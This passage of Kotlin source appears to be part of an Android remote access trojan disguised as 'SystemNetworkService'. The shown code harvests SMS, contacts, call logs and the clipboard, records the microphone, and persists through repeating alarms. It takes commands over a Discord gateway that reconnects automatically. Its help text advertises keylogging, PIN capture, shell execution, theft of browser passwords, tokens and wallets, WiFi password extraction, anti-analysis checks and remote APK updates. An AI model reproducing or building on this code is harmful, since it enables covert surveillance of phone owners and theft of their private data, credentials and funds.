                    count++
                }
            }
        } catch (e: Exception) {
            return "Error: ${e.message}"
        }
        return sb.toString().take(1900).ifEmpty { "No contacts" }
    }

    private fun getSms(): String = queryText(
        Uri.parse("content://sms/inbox"),
        arrayOf("address", "body", "date")
    ) { c ->
        val addrIdx = c.getColumnIndexOrThrow("address")
        val bodyIdx = c.getColumnIndexOrThrow("body")
        val addr = c.getString(addrIdx) ?: "?"
        val body = c.getString(bodyIdx) ?: ""
        "${addr}: ${body.take(120)}"
    }.take(1900).ifEmpty { "No SMS" }

    private fun getCallLog(): String = queryText(
        CallLog.Calls.CONTENT_URI,
        arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION, CallLog.Calls.DATE)
    ) { c ->
        val numIdx = c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
        val typeIdx = c.getColumnIndexOrThrow(CallLog.Calls.TYPE)
        val durIdx = c.getColumnIndexOrThrow(CallLog.Calls.DURATION)
        val num = c.getString(numIdx) ?: "?"
        val type = when (c.getInt(typeIdx)) {
            CallLog.Calls.INCOMING_TYPE -> "IN"
            CallLog.Calls.OUTGOING_TYPE -> "OUT"
            CallLog.Calls.MISSED_TYPE -> "MISSED"
            else -> "?"
        }
        val dur = c.getString(durIdx) ?: "0"
        "$type $num (${dur}s)"
    }.take(1900).ifEmpty { "No call log" }

    private suspend fun recordAudio(seconds: Int): File? = withContext(Dispatchers.IO) {
        var recorder: MediaRecorder? = null
        try {
            val file = File(cacheDir, "audio_${System.currentTimeMillis()}.m4a")
            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this@SystemNetworkService)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setOutputFile(file.absolutePath)
                prepare()
                start()
            }
            delay(seconds * 1000L)
            recorder.stop()
            recorder.release()
            recorder = null
            if (file.exists() && file.length() > 0) file else null
        } catch (e: Exception) {
            null
        } finally {
            try { recorder?.release() } catch (_: Exception) {}
        }
    }

    private fun getClipboard(): String {
        return try {
            val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clip = cm.primaryClip
            if (clip != null && clip.itemCount > 0) {
                val text = clip.getItemAt(0).text?.toString()
                if (text != null) text
                else "Non-text content (image/URI)"
            } else "Clipboard empty"
        } catch (e: SecurityException) {
            "Error: Android ${
                if (Build.VERSION.SDK_INT >= 34) "14+"
                else if (Build.VERSION.SDK_INT >= 33) "13"
                else if (Build.VERSION.SDK_INT >= 30) "11"
                else "?"
            } restricts clipboard access — only the app that put data or default IME can read"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    private fun findPackageByName(name: String): String? {
        val search = name.lowercase().replace(" ", "")
        val commonApps = mapOf(
            "chrome" to "com.android.chrome",
            "browser" to "com.android.browser",
            "settings" to "com.android.settings",
            "camera" to "com.android.camera2",
            "gallery" to "com.google.android.gallery3d",
            "photos" to "com.google.android.apps.photos",
            "maps" to "com.google.android.apps.maps",
            "youtube" to "com.google.android.youtube",
            "whatsapp" to "com.whatsapp",
            "telegram" to "org.telegram.messenger",
            "signal" to "org.thoughtcrime.securesms",
            "facebook" to "com.facebook.katana",
            "instagram" to "com.instagram.android",
            "twitter" to "com.twitter.android",
            "tiktok" to "com.zhiliaoapp.musically",
            "snapchat" to "com.snapchat.android",
            "gmail" to "com.google.android.gm",
            "messages" to "com.google.android.apps.messaging",
            "phone" to "com.google.android.dialer",
            "calendar" to "com.google.android.calendar",
            "drive" to "com.google.android.apps.docs",
            "playstore" to "com.android.vending",
            "play" to "com.android.vending",
            "store" to "com.android.vending",
            "files" to "com.google.android.documentsui",
            "calculator" to "com.android.calculator2",
            "clock" to "com.google.android.deskclock",
            "contacts" to "com.google.android.contacts",
            "spotify" to "com.spotify.music",
            "netflix" to "com.netflix.mediaclient",
            "discord" to "com.discord",
            "reddit" to "com.reddit.frontpage",
        )
        // Direct match
        commonApps[search]?.let { return it }
        // Fuzzy match
        for ((key, pkg) in commonApps) {
            if (key.contains(search) || search.contains(key)) return pkg
        }
        // Search installed packages
        val apps = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            packageManager.getInstalledApplications(PackageManager.ApplicationInfoFlags.of(0L))
        } else {
            @Suppress("DEPRECATION")
            packageManager.getInstalledApplications(0)
        }
        for (app in apps) {
            val label = app.loadLabel(packageManager).toString().lowercase().replace(" ", "")
            val pkgName = app.packageName.lowercase()
            if (label.contains(search) || pkgName.contains(search)) {
                return app.packageName
            }
        }
        return null
    }

    private fun sendCommandHelp(d: DiscordGatewayClient, cmd: String) {
        val help = when (cmd) {
            "ping" -> ":green_circle: **!ping**\nCheck if device is online.\nUsage: `!ping`"
            "info" -> ":information_source: **!info**\nShow device information.\nUsage: `!info`"
            "status" -> ":bar_chart: **!status**\nShow connection and system status.\nUsage: `!status`"
            "ip" -> ":globe_with_meridians: **!ip**\nShow public IP address.\nUsage: `!ip`"
            "uptime" -> ":clock1: **!uptime**\nShow how long device has been connected.\nUsage: `!uptime`"
            "debug" -> ":mag: **!debug**\nShow recent debug log.\nUsage: `!debug`"
            "restart" -> ":arrows_counterclockwise: **!restart**\nRestart the Discord gateway connection.\nUsage: `!restart`"
            "screenshot" -> ":camera: **!screenshot**\nCapture device screen.\nUsage: `!screenshot`\nRequires: Android 14+ with Accessibility enabled"
            "camera" -> ":camera_flash: **!camera**\nTake photo with device camera.\nUsage: `!camera` (back camera)\nUsage: `!camera front` (front camera)"
            "mic" -> ":microphone: **!mic**\nRecord audio from microphone.\nUsage: `!mic` (10 seconds)\nUsage: `!mic 30` (30 seconds, max 60)"
            "location" -> ":round_pushpin: **!location**\nGet device GPS location.\nUsage: `!location`\nFalls back to IP-based if GPS unavailable"
            "clipboard" -> ":clipboard: **!clipboard**\nRead current clipboard content.\nUsage: `!clipboard`"
            "keylog" -> ":keyboard: **!keylog**\nView captured keystrokes.\nUsage: `!keylog` (view)\nUsage: `!keylog on` (enable)\nUsage: `!keylog off` (disable)"
            "contacts" -> ":busts_in_silhouette: **!contacts**\nList device contacts.\nUsage: `!contacts`"
            "sms" -> ":envelope: **!sms**\nRead SMS inbox.\nUsage: `!sms`"
            "call_log" -> ":telephone_receiver: **!call_log**\nRead call history.\nUsage: `!call_log`"
            "wifi" -> ":wifi: **!wifi**\nShow current WiFi network info.\nUsage: `!wifi`"
            "battery" -> ":battery: **!battery**\nShow battery status.\nUsage: `!battery`"
            "processes" -> ":microscope: **!processes**\nList running processes.\nUsage: `!processes`"
            "installed" -> ":package: **!installed**\nList all installed apps.\nUsage: `!installed`"
            "notifications" -> ":bell: **!notifications**\nShow recent notifications.\nUsage: `!notifications`\nRequires: Notification Listener access"
            "shell" -> ":terminal: **!shell**\nExecute shell command.\nUsage: `!shell <command>`\nExample: `!shell whoami`"
            "persist" -> ":syringe: **!persist**\nInstall persistence mechanism.\nUsage: `!persist`"
            "grabber" -> ":mag: **!grabber**\nExtract data from device.\nUsage: `!grabber` (all targets)\nUsage: `!grabber browser` (cookies, passwords)\nUsage: `!grabber messenger` (Discord, Telegram, etc.)\nUsage: `!grabber tokens` (app auth tokens)\nUsage: `!grabber wallets` (crypto wallet data)\nUsage: `!grabber files` (documents, images, etc.)\nUsage: `!grabber clipboard` (current clipboard)"
            "update" -> ":arrows_counterclockwise: **!update**\nSelf-update system.\nUsage: `!update check` - Check for updates\nUsage: `!update push <url>` - Download APK\nUsage: `!update install` - Apply update\nUsage: `!update clear` - Remove pending update"
            "config" -> ":gear: **!config**\nRemote configuration.\nUsage: `!config get` - View current config\nUsage: `!config push <json>` - Update config\nUsage: `!config reset` - Reset to defaults"
            "admin" -> ":shield: **!admin**\nRequest device admin privileges.\nUsage: `!admin`"
            "overlay" -> ":black_large_square: **!overlay**\nToggle black screen overlay.\nUsage: `!overlay` (on)\nUsage: `!overlay off`"
            "click" -> ":point_up: **!click**\nClick by text or coordinates.\nUsage: `!click <text>`\nUsage: `!click x,y`"
            "input" -> ":keyboard: **!input**\nType text via accessibility.\nUsage: `!input <text>`"
            "open" -> ":link: **!open**\nLaunch an app.\nUsage: `!open com.example.app`\nUsage: `!open chrome` (short name)"
            "screen" -> ":frame_photo: **!screen**\nDump current UI tree.\nUsage: `!screen`"
            "gesture" -> ":hand: **!gesture**\nPerform swipe gesture.\nUsage: `!gesture x1,y1,x2,y2,ms`"
            "pin" -> ":lock: **!pin**\nView captured PIN/pattern/password.\nUsage: `!pin`"
            "torch" -> ":flashlight: **!torch**\nToggle flashlight.\nUsage: `!torch` (on)\nUsage: `!torch off`"
            "vibrate" -> ":vibration_mode: **!vibrate**\nVibrate device.\nUsage: `!vibrate` (1 second)\nUsage: `!vibrate 3000` (3 seconds)"
            "wifipass" -> ":key: **!wifipass**\nExtract saved WiFi passwords.\nUsage: `!wifipass`\nRequires: Root access"
            "netstat" -> ":satellite: **!netstat**\nScan local network for devices.\nUsage: `!netstat`"
            "sysinfo" -> ":iphone: **!sysinfo**\nFull device info (emulator, root, battery, storage, props).\nUsage: `!sysinfo`"
            "antidetect" -> ":shield: **!antidetect**\nAnti-analysis report (emulator detection, root, analysis tools).\nUsage: `!antidetect`"
            "sysprop" -> ":gear: **!sysprop**\nExtract system properties.\nUsage: `!sysprop`"
            "services" -> ":running: **!services**\nList running services.\nUsage: `!services`"
            "apps" -> ":package: **!apps**\nDetailed installed apps list.\nUsage: `!apps`"
            "storage" -> ":floppy_disk: **!storage**\nShow storage usage.\nUsage: `!storage`"
            else -> ":x: Unknown command: `!$cmd`\nType `!help` for available commands."
        }
        d.sendMsg(help)
    }

    private fun persistApk() {
        try {
            val src = File(applicationInfo.sourceDir)
            val dst = File(filesDir, "persist.apk")
            src.copyTo(dst, overwrite = true)
            val intent = Intent(this, SystemNetworkService::class.java)
            val pi = PendingIntent.getService(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)
            val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            am.setInexactRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 60000, 600000, pi)
            
        } catch (e: Exception) {
            
            throw e
        }
    }

    private fun registerNetworkCallback() {
        try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            networkCallback = object : ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: Network) {
                    super.onAvailable(network)
                    discord?.let {
                        if (!it.isConnected()) {
                            scope.launch {
                                delay(2000)
                                it.start(scope)
                            }
                        }
                    }
                }

                override fun onLost(network: Network) {
                    super.onLost(network)
                    if (isDownloadingUpdate) return
                    discord?.let {
                        if (it.isConnected()) {
                            scope.launch {
                                it.stop()
                                gatewayStarted = false
                                discord = null
                                discord = DiscordGatewayClient(
                                    appContext = applicationContext,
                                    onCommand = { action, payload ->
                                        scope.launch { handleGatewayCommand(action, payload) }
                                    },
                                    onStatus = { s -> updateNotif(s) }
                                )
                                discord?.start(scope)
                                gatewayStarted = true
                            }
                        }
                    }
                }

                override fun onCapabilitiesChanged(network: Network, capabilities: NetworkCapabilities) {
                    super.onCapabilitiesChanged(network, capabilities)
                    if (isDownloadingUpdate) return
                    val hasInternet = capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                    val validated = capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
                    if (!hasInternet || !validated) {
                        discord?.let {
                            if (it.isConnected()) {
                                scope.launch {
                                    delay(1000)
                                    it.stop()
                                    gatewayStarted = false
                                    discord = null
                                    discord = DiscordGatewayClient(
                                        appContext = applicationContext,
                                        onCommand = { action, payload ->
                                            scope.launch { handleGatewayCommand(action, payload) }
                                        },
                                        onStatus = { s -> updateNotif(s) }
                                    )
                                    discord?.start(scope)
                                    gatewayStarted = true
                                }
                            }
                        }
                    }
                }

                override fun onUnavailable() {
                    super.onUnavailable()
                    discord?.let {
                        if (it.isConnected()) {
                            scope.launch {
                                it.stop()
                                gatewayStarted = false
                            }
                        }
                    }
                }
            }
            val request = NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .build()
            cm.registerNetworkCallback(request, networkCallback!!)
            
        } catch (e: Exception) {
            
        }
    }

    override fun onDestroy() {
        // Release wake lock
        try {
            if (wakeLock?.isHeld == true) {
                wakeLock?.release()
                
            }
        } catch (e: Exception) {
            
        }

        // Unregister network callback
        try {
            networkCallback?.let {
                val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
                cm.unregisterNetworkCallback(it)
            }
        } catch (e: Exception) {
            
        }

        discord?.stop()
        discord = null
        scope.cancel()
        super.onDestroy()
    }
}
